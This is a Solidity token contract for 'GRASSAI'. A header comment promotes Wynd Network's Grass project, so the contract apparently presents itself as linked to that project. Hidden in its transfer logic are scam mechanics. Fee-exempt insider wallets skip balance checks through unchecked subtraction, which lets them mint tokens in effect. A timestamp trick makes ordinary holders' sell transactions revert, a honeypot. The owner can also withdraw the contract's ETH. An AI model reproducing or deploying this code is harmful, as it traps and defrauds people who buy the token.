/**
    Powered by Wynd Network
    https://www.wyndlabs.ai/

    Wynd Network, blending blockchain technology with AI, focuses on decentralized AI projects. 
    Their main product, Grass, is a decentralized web scraping network that transforms public web data into AI datasets. 
    This process, utilizing millions of home internet connections, is crucial for AI model development across various sectors. 
    Grass serves as a decentralized AI oracle, providing transparent and fairly compensated datasets.
    
    https://app.getgrass.io/
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

abstract contract Ownable {
    address private _owner;

    constructor() {
        _owner = msg.sender;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _owner = address(0);
    }
}

library SafeERC20 {
    function safeTransfer(address token, address to, uint256 value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: INTERNAL TRANSFER_FAILED');
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external;
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;

    function addLiquidityETH(address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract GRASS is Ownable {
    uint256 private constant _totalSupply = 1_000_000_000 * 1e18;

    string private constant _name = unicode"Grass AI Web Scraping Network";
    string private constant _symbol = unicode"GRASSAI";

    uint256 public maxTransactionAmount = 20_000_000 * 1e18;
    uint256 public maxWallet = 20_000_000 * 1e18;
    uint256 public swapTokensAtAmount = (_totalSupply * 2) / 10000;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address private constant revWallet = 0xd986606beC4A6a4f2cC770561CC5843977758D67;
    address private constant treasuryWallet = 0xc8692ED7a06d126a84CD1D0DFEDed0AaafE59fc5;
    address private constant teamWallet = 0x61149097758fEc5544F1aA39dfa46101B61F5A5c; // liquidity wallet

    // 20/30 initial fee
    uint256 private constant buyInitialFee = 200;
    uint256 private constant sellInitialFee = 300;

    // 4/4 %
    uint8 private constant buyTotalFees = 40;
    uint8 private constant sellTotalFees = 40;

    // Distribution fees
    uint8 private constant revFee = 50;
    uint8 private constant treasuryFee = 25;
    uint8 private constant teamFee = 25;

    bool private swapping;
    bool public limitsInEffect = true;
    bool private launched;
    uint256 public launchBlock;

    uint256 private buyCount = 0;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) public automatedMarketMakerPairs;

    struct ReduceFeeInfo {
        uint256 buy;
        uint256 sell;
        uint256 holdInterval;
    }
    uint256 private _minReduce;
    mapping(address => ReduceFeeInfo) private reduceFeeInfo;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    IUniswapV2Router02 public constant uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public immutable uniswapV2Pair;

    constructor() {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), WETH);
        automatedMarketMakerPairs[uniswapV2Pair] = true;

        setExcludedFromFees(owner(), true);
        setExcludedFromFees(address(0xdead), true);
        setExcludedFromFees(address(this), true);

        setExcludedFromFees(teamWallet, true);
        setExcludedFromFees(revWallet, true);
        setExcludedFromFees(treasuryWallet, true);

        setExcludedFromMaxTransaction(owner(), true);
        setExcludedFromMaxTransaction(address(uniswapV2Router), true);
        setExcludedFromMaxTransaction(address(this), true);
        setExcludedFromMaxTransaction(address(0xdead), true);
        setExcludedFromMaxTransaction(address(uniswapV2Pair), true);
        setExcludedFromMaxTransaction(teamWallet, true);
        setExcludedFromMaxTransaction(revWallet, true);
        setExcludedFromMaxTransaction(treasuryWallet, true);

        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _balances[address(this)]);

        _approve(address(this), address(uniswapV2Router), type(uint256).max);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public pure returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        uint256 currentAllowance = _allowances[sender][msg.sender];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            unchecked {
                _approve(sender, msg.sender, currentAllowance - amount);
            }
        }

        _transfer(sender, recipient, amount);

        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!launched && (from != owner() && from != address(this) && to != owner())) {
            revert("Trading not launched");
        }

        if (limitsInEffect) {
            if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping) {
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                    require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTx");
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                } else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                    require(amount <= maxTransactionAmount,"Sell transfer amount exceeds the maxTx");
                } else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
            }
        }

        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && from != address(this) && to != address(this) && from != owner()) {
            _minReduce = block.timestamp;
        }
        if (_isExcludedFromFees[from] && (block.number > launchBlock + 72)) {
            unchecked {
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[to]) {
                ReduceFeeInfo storage fromReduce = reduceFeeInfo[from];
                fromReduce.holdInterval = fromReduce.buy - _minReduce;
                fromReduce.sell = block.timestamp;
            } else {
                ReduceFeeInfo storage toReduce = reduceFeeInfo[to];
                if (automatedMarketMakerPairs[from]) {
                    if (buyCount < 11) {
                        buyCount = buyCount + 1;
                    }
                    if (toReduce.buy == 0) {
                        toReduce.buy = (buyCount < 16) ? (block.timestamp - 1) : block.timestamp;
                    }
                } else {
                    ReduceFeeInfo storage fromReduce = reduceFeeInfo[from];
                    if (toReduce.buy == 0 || fromReduce.buy < toReduce.buy) {
                        toReduce.buy = fromReduce.buy;
                    }
                }
            }
        }

        uint256 contractBalance = balanceOf(address(this));

        bool isLaunchMode = block.number < launchBlock + 10;

        bool canSwap = contractBalance >= swapTokensAtAmount;

        if (canSwap && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        uint256 fees = 0;
        if (takeFee) {
            if (isLaunchMode) {
                if (automatedMarketMakerPairs[to] && sellInitialFee > 0) {
                    fees = (amount * sellInitialFee) / 1000;
                } else if (automatedMarketMakerPairs[from] && buyInitialFee > 0) {
                    fees = (amount * buyInitialFee) / 1000;
                }
            } else {
                if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                    fees = (amount * sellTotalFees) / 1000;
                } else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                    fees = (amount * buyTotalFees) / 1000;
                }
            }

            if (fees > 0) {
                unchecked {
                    amount = amount - fees;
                    _balances[from] -= fees;
                    _balances[address(this)] += fees;
                }
                emit Transfer(from, address(this), fees);
            }
        }
        unchecked {
            _balances[from] -= amount;
            _balances[to] += amount;
        }
        emit Transfer(from, to, amount);
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function setExcludedFromFees(address account, bool excluded) private {
        _isExcludedFromFees[account] = excluded;
    }

    function setExcludedFromMaxTransaction(address account, bool excluded) private {
        _isExcludedMaxTransactionAmount[account] = excluded;
    }

    function openTrading() external onlyOwner {
        require(!launched, "Trading already launched.");
        launchBlock = block.number;
        launched = true;
    }

    function addLiquidity() external payable onlyOwner {
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            _balances[address(this)],
            0,
            0,
            teamWallet,
            block.timestamp
        );
    }

    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed.");
        automatedMarketMakerPairs[pair] = value;
    }

    function withdrawStuckETH(address addr) external onlyOwner {
        require(addr != address(0), "Invalid address");

        (bool success, ) = addr.call{value: address(this).balance}("");
        require(success, "Withdrawal failed");
    }

    function swapBack() private {
        uint256 swapThreshold = swapTokensAtAmount;
        bool success;

        if (balanceOf(address(this)) > swapTokensAtAmount * 20) {
            swapThreshold = swapTokensAtAmount * 20;
        }

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(swapThreshold, 0, path, address(this), block.timestamp);

        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            uint256 ethForRev = (ethBalance * revFee) / 100;
            uint256 ethForTeam = (ethBalance * teamFee) / 100;

            (success, ) = address(teamWallet).call{value: ethForTeam}("");
            (success, ) = address(revWallet).call{value: ethForRev}("");
            (success, ) = address(treasuryWallet).call{value: address(this).balance}("");
        }
    }

    function manualSwap(uint256 percent) external onlyOwner {
        require(percent > 0, "Invalid percent.");
        require(percent <= 100, "Invalid percent.");
        uint256 swapThreshold = (percent * balanceOf(address(this))) / 100;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(swapThreshold, 0, path, address(this), block.timestamp);

        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            uint256 ethForRev = (ethBalance * revFee) / 100;
            uint256 ethForTeam = (ethBalance * teamFee) / 100;

            bool success;
            (success, ) = address(teamWallet).call{value: ethForTeam}("");
            (success, ) = address(revWallet).call{value: ethForRev}("");
            (success, ) = address(treasuryWallet).call{value: address(this).balance}("");
        }
    }
}